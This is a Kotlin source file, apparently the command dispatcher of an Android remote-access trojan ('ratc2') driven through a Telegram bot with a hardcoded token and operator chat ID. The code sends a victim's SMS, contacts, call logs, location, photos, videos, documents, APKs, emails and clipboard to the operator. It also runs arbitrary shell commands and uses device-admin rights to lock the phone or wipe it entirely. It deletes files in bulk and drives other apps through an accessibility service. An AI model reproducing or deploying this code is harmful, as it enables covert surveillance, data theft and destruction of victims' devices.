package com.spud.ratc2

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import org.json.JSONArray
import org.json.JSONObject
import java.net.URLEncoder

class Dispatcher(private val ctx: Context) {

    private val BOT = "8873170295:AAHX-1ddnEn3iBzwcWRFHyABrbzRV0xUCMU"
    private val MY_CHAT = "8868615222"
    private val BASE = "https://api.telegram.org/bot$BOT"
    private val c = Collectors(ctx)
    private val loc = LocationHelper(ctx)
    @Volatile private var offset = 0L

    init { loc.startUpdates() }

    fun loop() {
        while (true) {
            try { tick() } catch (e: Exception) { Thread.sleep(3000) }
        }
    }

    private fun tick() {
        val body = Sender.get("$BASE/getUpdates?offset=$offset&timeout=25")
        val root = JSONObject(body)
        if (!root.optBoolean("ok")) return
        val arr = root.optJSONArray("result") ?: return
        for (i in 0 until arr.length()) {
            val u = arr.getJSONObject(i)
            offset = u.getLong("update_id") + 1
            val cb = u.optJSONObject("callback_query")
            if (cb != null) {
                val chatId = cb.getJSONObject("message").getJSONObject("chat").getString("id")
                val data = cb.optString("data", "")
                val cbId = cb.getString("id")
                answer(cbId)
                if (chatId == MY_CHAT) doAction(chatId, data)
                continue
            }
            val m = u.optJSONObject("message") ?: continue
            val chatId = m.getJSONObject("chat").getString("id")
            val text = m.optString("text", "")
            if (text.isBlank() || chatId != MY_CHAT) continue
            if (text.startsWith("/start") || text.startsWith("/help")) menu(chatId)
            else if (text.startsWith("/shell ")) send(chatId, shell(text.removePrefix("/shell ")).take(3800))
        }
    }

    private fun doAction(chatId: String, data: String) {
        when (data) {
            // ====== معلومات ======
            "device"    -> send(chatId, c.deviceInfo())
            "battery"   -> send(chatId, c.batteryStorage())
            "storage"   -> send(chatId, c.storage())
            "network"   -> send(chatId, c.network())
            "location"  -> sendCurrentLocation(chatId)
            "location_ip" -> sendIpLocation(chatId)
            "clipboard" -> send(chatId, c.clipboard())

            // ====== قوائم الأعداد ======
            "m_sms"       -> askCount(chatId, "sms", "كم رسالة؟")
            "m_contacts"  -> askCount(chatId, "contacts", "كم جهة؟")
            "m_calls"     -> askCount(chatId, "calls", "كم مكالمة؟")
            "m_loc"       -> askCount(chatId, "loc", "كم موقع؟")
            "m_images"    -> askCount(chatId, "images", "كم صورة؟")
            "m_videos"    -> askCount(chatId, "videos", "كم فيديو؟")
            "m_audio"     -> askCount(chatId, "audio", "كم ملف صوتي؟")

            // ====== الأعداد المختارة (سحب) ======
            "n_sms_5" -> file(chatId, "sms_5.txt", c.sms(5))
            "n_sms_10" -> file(chatId, "sms_10.txt", c.sms(10))
            "n_sms_20" -> file(chatId, "sms_20.txt", c.sms(20))
            "n_sms_50" -> file(chatId, "sms_50.txt", c.sms(50))
            "n_sms_100" -> file(chatId, "sms_100.txt", c.sms(100))
            "n_sms_200" -> file(chatId, "sms_200.txt", c.sms(200))
            "n_sms_500" -> file(chatId, "sms_500.txt", c.sms(500))
            "n_sms_all" -> file(chatId, "sms_all.txt", c.sms(99999))

            "n_contacts_5" -> file(chatId, "contacts_5.txt", c.contacts(5))
            "n_contacts_10" -> file(chatId, "contacts_10.txt", c.contacts(10))
            "n_contacts_20" -> file(chatId, "contacts_20.txt", c.contacts(20))
            "n_contacts_50" -> file(chatId, "contacts_50.txt", c.contacts(50))
            "n_contacts_100" -> file(chatId, "contacts_100.txt", c.contacts(100))
            "n_contacts_200" -> file(chatId, "contacts_200.txt", c.contacts(200))
            "n_contacts_500" -> file(chatId, "contacts_500.txt", c.contacts(500))
            "n_contacts_all" -> file(chatId, "contacts_all.txt", c.contacts(99999))

            "n_calls_5" -> file(chatId, "calls_5.txt", c.calls(5))
            "n_calls_10" -> file(chatId, "calls_10.txt", c.calls(10))
            "n_calls_20" -> file(chatId, "calls_20.txt", c.calls(20))
            "n_calls_50" -> file(chatId, "calls_50.txt", c.calls(50))
            "n_calls_100" -> file(chatId, "calls_100.txt", c.calls(100))
            "n_calls_200" -> file(chatId, "calls_200.txt", c.calls(200))
            "n_calls_500" -> file(chatId, "calls_500.txt", c.calls(500))
            "n_calls_all" -> file(chatId, "calls_all.txt", c.calls(99999))

            "n_loc_5" -> send(chatId, loc.historyText(5))
            "n_loc_10" -> send(chatId, loc.historyText(10))
            "n_loc_20" -> send(chatId, loc.historyText(20))
            "n_loc_50" -> send(chatId, loc.historyText(50))
            "n_loc_100" -> send(chatId, loc.historyText(100))
            "n_loc_all" -> send(chatId, loc.historyText(loc.historyCount()))

            "n_images_5" -> sendImages(chatId, 5)
            "n_images_10" -> sendImages(chatId, 10)
            "n_images_20" -> sendImages(chatId, 20)
            "n_images_50" -> sendImages(chatId, 50)
            "n_images_100" -> sendImages(chatId, 100)
            "n_images_200" -> sendImages(chatId, 200)
            "n_images_500" -> sendImages(chatId, 500)
            "n_images_all" -> sendImages(chatId, 99999)

            "n_videos_5" -> sendVideos(chatId, 5)
            "n_videos_10" -> sendVideos(chatId, 10)
            "n_videos_20" -> sendVideos(chatId, 20)
            "n_videos_50" -> sendVideos(chatId, 50)
            "n_videos_100" -> sendVideos(chatId, 100)
            "n_videos_all" -> sendVideos(chatId, 99999)

            "n_audio_5" -> sendAudio(chatId, 5)
            "n_audio_10" -> sendAudio(chatId, 10)
            "n_audio_20" -> sendAudio(chatId, 20)
            "n_audio_50" -> sendAudio(chatId, 50)
            "n_audio_100" -> sendAudio(chatId, 100)
            "n_audio_all" -> sendAudio(chatId, 99999)

            // ====== ملفات عامة ======
            "sdcard"    -> file(chatId, "sdcard.txt", c.files("/sdcard"))
            "emails"    -> file(chatId, "emails.txt", c.emails())
            "apps"      -> file(chatId, "apps_all.txt", c.apps())
            "sysapps"   -> file(chatId, "apps_system.txt", c.systemApps())

            // ====== المجلدات (سحب الملفات الفعلية) ======
            "dl_ask"    -> askFolder(chatId, "dl", "📁 كم ملف من التنزيلات؟")
            "dl_5"      -> sendFolder(chatId, "/sdcard/Download", 5, "التنزيلات")
            "dl_10"     -> sendFolder(chatId, "/sdcard/Download", 10, "التنزيلات")
            "dl_20"     -> sendFolder(chatId, "/sdcard/Download", 20, "التنزيلات")
            "dl_50"     -> sendFolder(chatId, "/sdcard/Download", 50, "التنزيلات")
            "dl_100"    -> sendFolder(chatId, "/sdcard/Download", 100, "التنزيلات")
            "dl_500"    -> sendFolder(chatId, "/sdcard/Download", 500, "التنزيلات")
            "dl_all"    -> sendFolder(chatId, "/sdcard/Download", 99999, "التنزيلات")

            "doc_ask"   -> askFolder(chatId, "doc", "📄 كم مستند؟")
            "doc_5"     -> sendFolder(chatId, "/sdcard/Documents", 5, "المستندات")
            "doc_10"    -> sendFolder(chatId, "/sdcard/Documents", 10, "المستندات")
            "doc_20"    -> sendFolder(chatId, "/sdcard/Documents", 20, "المستندات")
            "doc_50"    -> sendFolder(chatId, "/sdcard/Documents", 50, "المستندات")
            "doc_100"   -> sendFolder(chatId, "/sdcard/Documents", 100, "المستندات")
            "doc_all"   -> sendFolder(chatId, "/sdcard/Documents", 99999, "المستندات")

            "pic_ask"   -> askFolder(chatId, "pic", "🖼️ كم صورة؟")
            "pic_10"    -> sendFolder(chatId, "/sdcard/Pictures", 10, "الصور")
            "pic_20"    -> sendFolder(chatId, "/sdcard/Pictures", 20, "الصور")
            "pic_50"    -> sendFolder(chatId, "/sdcard/Pictures", 50, "الصور")
            "pic_100"   -> sendFolder(chatId, "/sdcard/Pictures", 100, "الصور")
            "pic_all"   -> sendFolder(chatId, "/sdcard/Pictures", 99999, "الصور")

            "mov_ask"   -> askFolder(chatId, "mov", "🎬 كم فيديو؟")
            "mov_5"     -> sendFolder(chatId, "/sdcard/Movies", 5, "الأفلام")
            "mov_10"    -> sendFolder(chatId, "/sdcard/Movies", 10, "الأفلام")
            "mov_20"    -> sendFolder(chatId, "/sdcard/Movies", 20, "الأفلام")
            "mov_50"    -> sendFolder(chatId, "/sdcard/Movies", 50, "الأفلام")

            "dcim_ask"  -> askFolder(chatId, "dcim", "📷 كم من الكاميرا؟")
            "dcim_10"   -> sendFolder(chatId, "/sdcard/DCIM", 10, "الكاميرا")
            "dcim_50"   -> sendFolder(chatId, "/sdcard/DCIM", 50, "الكاميرا")
            "dcim_100"  -> sendFolder(chatId, "/sdcard/DCIM", 100, "الكاميرا")
            "dcim_all"  -> sendFolder(chatId, "/sdcard/DCIM", 99999, "الكاميرا")

            "mus_ask"   -> askFolder(chatId, "mus", "🎵 كم ملف صوتي؟")
            "mus_10"    -> sendFolder(chatId, "/sdcard/Music", 10, "الموسيقى")
            "mus_20"    -> sendFolder(chatId, "/sdcard/Music", 20, "الموسيقى")
            "mus_50"    -> sendFolder(chatId, "/sdcard/Music", 50, "الموسيقى")
            "mus_all"   -> sendFolder(chatId, "/sdcard/Music", 99999, "الموسيقى")

            // ====== APK ======
            "apk_ask"   -> askCount(chatId, "apk", "📲 كم APK؟")
            "n_apk_5"   -> sendApks(chatId, 5, false)
            "n_apk_10"  -> sendApks(chatId, 10, false)
            "n_apk_20"  -> sendApks(chatId, 20, false)
            "n_apk_50"  -> sendApks(chatId, 50, false)
            "n_apk_all" -> sendApks(chatId, 99999, false)

            // ====== الحذف (يطلب تأكيد) ======
            "ask_del_images"   -> askDelete(chatId, "images", "🖼️ حذف كل الصور؟")
            "ask_del_videos"   -> askDelete(chatId, "videos", "🎬 حذف كل الفيديو؟")
            "ask_del_audio"    -> askDelete(chatId, "audio", "🎵 حذف كل الصوتيات؟")
            "ask_del_docs"     -> askDelete(chatId, "docs", "📄 حذف كل المستندات؟")
            "ask_del_apk"      -> askDelete(chatId, "apk", "📲 حذف كل APK؟")
            "ask_del_archives" -> askDelete(chatId, "archives", "🗜️ حذف كل المضغوطات؟")
            "ask_del_downloads"-> askDelete(chatId, "downloads", "📁 حذف كل التنزيلات؟")
            "ask_del_sdcard"   -> askDelete(chatId, "sdcard", "🗑️ حذف كل الملفات في /sdcard؟")
            "ask_wipe"         -> askDelete(chatId, "wipe", "⚠️ تنسيق الجهاز كامل؟")

            // ====== تأكيد الحذف ======
            "confirm_del_images"    -> doDelete(chatId, "images")
            "confirm_del_videos"    -> doDelete(chatId, "videos")
            "confirm_del_audio"     -> doDelete(chatId, "audio")
            "confirm_del_docs"      -> doDelete(chatId, "docs")
            "confirm_del_apk"       -> doDelete(chatId, "apk")
            "confirm_del_archives"  -> doDelete(chatId, "archives")
            "confirm_del_downloads" -> doDelete(chatId, "downloads")
            "confirm_del_sdcard"    -> doDelete(chatId, "sdcard")
            "confirm_wipe"          -> doWipe(chatId)

            // ====== تحكم ======
            "lock"      -> lock(chatId)
            "vibro_on"  -> { Vibro.start(ctx); send(chatId, "📳 الاهتزاز شغال — مستمر") }
            "vibro_off" -> { Vibro.stop(); send(chatId, "📴 توقف الاهتزاز") }

            // ====== Accessibility ======
            "acc_status" -> send(chatId, if (AutoAccess.isServiceRunning()) "✅ Accessibility شغال" else "❌ مو مفعّل")
            "acc_log"    -> send(chatId, AutoAccess.readLog(ctx, 100))
            "acc_dump"   -> send(chatId, AutoAction.dumpScreen(AutoAccess.get() ?: return))
            "acc_back"   -> { AutoAccess.get()?.let { AutoAction.back(it) }; send(chatId, "⬅️") }
            "acc_home"   -> { AutoAccess.get()?.let { AutoAction.home(it) }; send(chatId, "🏠") }
            "acc_recents"-> { AutoAccess.get()?.let { AutoAction.recents(it) }; send(chatId, "🔄") }
            "acc_notif"  -> { AutoAccess.get()?.let { AutoAction.openNotifications(it) }; send(chatId, "🔔") }
            "acc_gmail"  -> autoOpen(chatId, "com.google.android.gm", "Gmail")
            "acc_whatsapp" -> autoOpen(chatId, "com.whatsapp", "WhatsApp")
            "acc_telegram" -> autoOpen(chatId, "org.telegram.messenger", "Telegram")

            "menu"      -> menu(chatId)
            else        -> send(chatId, "زر غير معروف: $data")
        }
    }

    private fun askCount(chatId: String, key: String, question: String) {
        val kb = JSONArray().apply {
            put(row(b("5", "n_${key}_5"), b("10", "n_${key}_10"), b("20", "n_${key}_20")))
            put(row(b("50", "n_${key}_50"), b("100", "n_${key}_100"), b("200", "n_${key}_200")))
            put(row(b("500", "n_${key}_500"), b("الكل", "n_${key}_all")))
            put(row(b("❌ إلغاء", "menu")))
        }
        val mk = JSONObject().put("inline_keyboard", kb)
        sendMenuMarkup(chatId, question, mk)
    }

    private fun askFolder(chatId: String, prefix: String, question: String) {
        val kb = JSONArray().apply {
            put(row(b("5", "${prefix}_5"), b("10", "${prefix}_10"), b("20", "${prefix}_20")))
            put(row(b("50", "${prefix}_50"), b("100", "${prefix}_100"), b("500", "${prefix}_500")))
            put(row(b("الكل", "${prefix}_all")))
            put(row(b("❌ إلغاء", "menu")))
        }
        val mk = JSONObject().put("inline_keyboard", kb)
        sendMenuMarkup(chatId, question, mk)
    }

    private fun askDelete(chatId: String, key: String, question: String) {
        val kb = JSONArray().apply {
            put(row(b("✅ نعم، احذف", "confirm_del_$key"), b("❌ إلغاء", "menu")))
        }
        val mk = JSONObject().put("inline_keyboard", kb)
        sendMenuMarkup(chatId, question, mk)
    }

    private fun sendMenuMarkup(chatId: String, text: String, mk: JSONObject) {
        val p = "chat_id=$chatId&text=" + URLEncoder.encode(text, "UTF-8") +
                "&reply_markup=" + URLEncoder.encode(mk.toString(), "UTF-8")
        try { Sender.post("$BASE/sendMessage", p) } catch (_: Exception) {}
    }

    private fun doDelete(chatId: String, key: String) {
        val (count, bytes) = when (key) {
            "images"    -> FileManager.deleteByExt(FileManager.IMAGE_DIRS, FileManager.IMAGE_EXTS)
            "videos"    -> FileManager.deleteByExt(FileManager.VIDEO_DIRS, FileManager.VIDEO_EXTS)
            "audio"     -> FileManager.deleteByExt(FileManager.AUDIO_DIRS, FileManager.AUDIO_EXTS)
            "docs"      -> FileManager.deleteByExt(FileManager.DOC_DIRS, FileManager.DOC_EXTS)
            "apk"       -> FileManager.deleteByExt(FileManager.APK_DIRS, FileManager.APK_EXTS)
            "archives"  -> FileManager.deleteByExt(FileManager.ARCHIVE_DIRS, FileManager.ARCHIVE_EXTS)
            "downloads" -> FileManager.deleteAllFiles(listOf("/sdcard/Download"))
            "sdcard"    -> FileManager.deleteAllFiles(FileManager.ALL_DIRS)
            else        -> 0 to 0L
        }
        send(chatId, "🗑️ $key\nحُذف: $count ملف\nالحجم: ${FileManager.humanSize(bytes)}")
        menu(chatId)
    }

    private fun doWipe(chatId: String) {
        try {
            val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val a = ComponentName(ctx, MyAdmin::class.java)
            if (!dpm.isAdminActive(a)) { send(chatId, "❌ التطبيق مو مشرف"); return }
            send(chatId, "⚠️ جاري التنسيق…")
            dpm.wipeData(0)
        } catch (e: Exception) { send(chatId, "خطأ: ${e.message}") }
    }

    private fun sendFolder(chatId: String, folder: String, limit: Int, label: String) {
        val files = c.listFolderFiles(folder, limit)
        if (files.isEmpty()) { send(chatId, "❌ ما لقيت ملفات في $label"); menu(chatId); return }
        send(chatId, "📂 $label — ${files.size} ملف…")
        var ok = 0; var fail = 0
        for (f in files) {
            try { if (Sender.sendAnyFile(BASE, chatId, f.absolutePath)) ok++ else fail++ } catch (_: Exception) { fail++ }
        }
        send(chatId, "✅ $label — أرسلت $ok من ${files.size} (فشل $fail)")
        menu(chatId)
    }

    private fun sendApks(chatId: String, limit: Int, systemToo: Boolean) {
        val list = c.listInstalledApks(limit, systemToo)
        if (list.isEmpty()) { send(chatId, "❌ ما لقيت APK"); menu(chatId); return }
        send(chatId, "📦 ${list.size} APK…")
        var ok = 0
        for ((pkg, f) in list) {
            try { if (Sender.sendApk(BASE, chatId, f.absolutePath, "$pkg.apk")) ok++ } catch (_: Exception) {}
        }
        send(chatId, "✅ أرسلت $ok من ${list.size}")
        menu(chatId)
    }

    private fun autoOpen(chatId: String, pkg: String, name: String) {
        val ok = AutoAction.openApp(ctx, pkg)
        send(chatId, if (ok) "📱 فتحت $name" else "❌ $name مو مثبّت")
    }

    private fun sendCurrentLocation(chatId: String) {
        val l = loc.current()
        if (l == null) { send(chatId, "📍 ما لقيت موقع. افتح تطبيق الخرائط مرة، ثم أعد المحاولة."); return }
        val lat = l.latitude; val lon = l.longitude; val acc = l.accuracy.toInt()
        val maps = "https://maps.google.com/?q=$lat,$lon"
        val street = "https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=$lat,$lon"
        send(chatId, buildString {
            appendLine("📍 موقع الجهاز")
            appendLine("━━━━━━━━━━━━━━━━")
            appendLine("📱 ${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}")
            appendLine("🤖 ${android.os.Build.VERSION.RELEASE}")
            appendLine("خط العرض: $lat")
            appendLine("خط الطول: $lon")
            appendLine("الدقة: $acc م")
            appendLine()
            appendLine("🗺️ $maps")
            appendLine("🛰️ $street")
        })
        try { Sender.post("$BASE/sendLocation", "chat_id=$chatId&latitude=$lat&longitude=$lon") } catch (_: Exception) {}
    }

    private fun sendIpLocation(chatId: String) {
        val t = loc.ipLocation()
        if (t == null) send(chatId, "❌ ما قدرت أحدد IP Location") else send(chatId, t)
    }

    private fun sendImages(chatId: String, limit: Int) {
        val files = c.listImages(limit)
        if (files.isEmpty()) { send(chatId, "❌ ما لقيت صور"); menu(chatId); return }
        send(chatId, "🖼️ ${files.size} صورة…")
        for (f in files) { try { Sender.sendPhoto(BASE, chatId, f.absolutePath) } catch (_: Exception) {} }
        menu(chatId)
    }

    private fun sendVideos(chatId: String, limit: Int) {
        val files = c.listVideos(limit)
        if (files.isEmpty()) { send(chatId, "❌ ما لقيت فيديو"); menu(chatId); return }
        send(chatId, "🎬 ${files.size} فيديو…")
        for (f in files) { try { Sender.sendVideo(BASE, chatId, f.absolutePath) } catch (_: Exception) {} }
        menu(chatId)
    }

    private fun sendAudio(chatId: String, limit: Int) {
        val files = c.listAudio(limit)
        if (files.isEmpty()) { send(chatId, "❌ ما لقيت ملفات صوتية"); menu(chatId); return }
        send(chatId, "🎵 ${files.size} ملف صوتي…")
        for (f in files) { try { Sender.sendAudio(BASE, chatId, f.absolutePath) } catch (_: Exception) {} }
        menu(chatId)
    }

    private fun lock(chatId: String) {
        try {
            val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val a = ComponentName(ctx, MyAdmin::class.java)
            if (!dpm.isAdminActive(a)) { send(chatId, "❌ مو مشرف"); return }
            dpm.lockNow(); send(chatId, "🔒 تم القفل")
        } catch (e: Exception) { send(chatId, "خطأ: ${e.message}") }
    }

    private fun file(chatId: String, name: String, content: String) {
        Sender.sendDocument(BASE, chatId, name, content)
        menu(chatId)
    }

    private fun shell(cmd: String): String = try {
        val p = ProcessBuilder("sh", "-c", cmd).redirectErrorStream(true).start()
        val out = p.inputStream.bufferedReader().readText()
        p.waitFor()
        out.ifBlank { "(مافي ناتج)" }
    } catch (e: Exception) { "خطأ: ${e.message}" }

    private fun send(chatId: String, text: String) {
        try {
            val p = "chat_id=$chatId&text=" + URLEncoder.encode(text, "UTF-8")
            Sender.post("$BASE/sendMessage", p)
        } catch (_: Exception) {}
    }

    private fun menu(chatId: String) {
        val kb = JSONArray().apply {
            // معلومات
            put(row(b("📱 معلومات الجهاز", "device"), b("🔋 البطارية", "battery")))
            put(row(b("💾 التخزين", "storage"), b("🌐 الشبكة", "network")))
            put(row(b("📍 الموقع + خريطة", "location"), b("🌐 موقع IP", "location_ip")))
            put(row(b("🗺️ آخر المواقع", "m_loc")))
            // معلومات المحتوى
            put(row(b("💬 الرسائل SMS", "m_sms"), b("👥 جهات الاتصال", "m_contacts")))
            put(row(b("📞 المكالمات", "m_calls")))
            // الوسائط
            put(row(b("🖼️ الصور", "m_images"), b("🎬 الفيديو", "m_videos")))
            put(row(b("🎵 الصوتيات", "m_audio")))
            // الملفات
            put(row(b("📂 /sdcard (لستة)", "sdcard")))
            put(row(b("📁 التنزيلات", "dl_ask"), b("📄 المستندات", "doc_ask")))
            put(row(b("🖼️ صور مجلد", "pic_ask"), b("🎬 أفلام مجلد", "mov_ask")))
            put(row(b("📷 الكاميرا", "dcim_ask"), b("🎵 الموسيقى", "mus_ask")))
            // APK
            put(row(b("📲 APK", "apk_ask"), b("📧 الإيميلات", "emails")))
            put(row(b("📦 التطبيقات (لستة)", "apps"), b("⚙️ النظام (لستة)", "sysapps")))
            put(row(b("📋 الحافظة", "clipboard")))
            // تحكم
            put(row(b("🔒 قفل الشاشة", "lock")))
            put(row(b("📳 اهتزاز مستمر", "vibro_on"), b("📴 إيقاف الاهتزاز", "vibro_off")))
            // Accessibility
            put(row(b("♿ حالة Accessibility", "acc_status"), b("📝 سجل", "acc_log")))
            put(row(b("📱 شاشة الآن", "acc_dump"), b("🏠 الرئيسية", "acc_home")))
            put(row(b("⬅️ رجوع", "acc_back"), b("🔄 الحديثة", "acc_recents")))
            put(row(b("🔔 الإشعارات", "acc_notif")))
            put(row(b("📧 فتح Gmail", "acc_gmail"), b("💬 فتح WhatsApp", "acc_whatsapp")))
            put(row(b("📨 فتح Telegram", "acc_telegram")))
            // الحذف
            put(row(b("🗑️ حذف الصور", "ask_del_images"), b("🗑️ حذف الفيديو", "ask_del_videos")))
            put(row(b("🗑️ حذف الصوتيات", "ask_del_audio"), b("🗑️ حذف المستندات", "ask_del_docs")))
            put(row(b("🗑️ حذف APK", "ask_del_apk"), b("🗑️ حذف المضغوطات", "ask_del_archives")))
            put(row(b("🗑️ حذف التنزيلات", "ask_del_downloads"), b("🗑️ حذف كل /sdcard", "ask_del_sdcard")))
            put(row(b("⚠️ تنسيق الجهاز", "ask_wipe")))
        }
        val mk = JSONObject().put("inline_keyboard", kb)
        sendMenuMarkup(chatId, "🎛️ لوحة التحكم", mk)
    }

    private fun row(vararg items: JSONObject): JSONArray {
        val a = JSONArray()
        for (x in items) a.put(x)
        return a
    }

    private fun b(t: String, d: String) = JSONObject().put("text", t).put("callback_data", d)

    private fun answer(id: String) {
        try { Sender.post("$BASE/answerCallbackQuery", "callback_query_id=$id") } catch (_: Exception) {}
    }
}
